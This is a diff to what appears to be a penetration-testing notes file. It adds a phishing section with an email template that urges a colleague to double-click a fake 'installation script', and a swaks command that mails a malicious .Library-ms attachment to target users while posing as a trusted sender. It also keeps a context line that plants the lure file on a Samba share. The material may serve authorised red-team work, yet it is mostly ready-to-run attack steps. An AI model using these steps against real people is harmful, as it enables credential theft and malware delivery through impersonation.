@@ -84,4 +84,22 @@ Instead of sending the Library file by email, it can be shared by Samba:
 smbclient //$TargetIp/$TargetSharedDirectory -c 'put myautomatedfakeinstalltofoolsomeuser.Library-ms'
 ```
 
+## Phishing email
+
+Body:
+```
+Hello John,
+In attachment, you'll find a link to the installation script with new security features. Double-click on it and execute the configuration.
+Best
+Bob
+```
+
+Lnk file in attachment: to build with a Windows workstation
+
+Swaks command:
+```
+kali$ sudo swaks -t user1_to_hack@some-org.com -t user2_to_hack@some-org.com --from bob@some-org.com --attach @config.Library-ms --server $IpSmtpServer --body @body.txt --header "Subject: Installation script" --suppress-data -ap
+```
+and identify with bob's login and password to the SMTP server
+
 
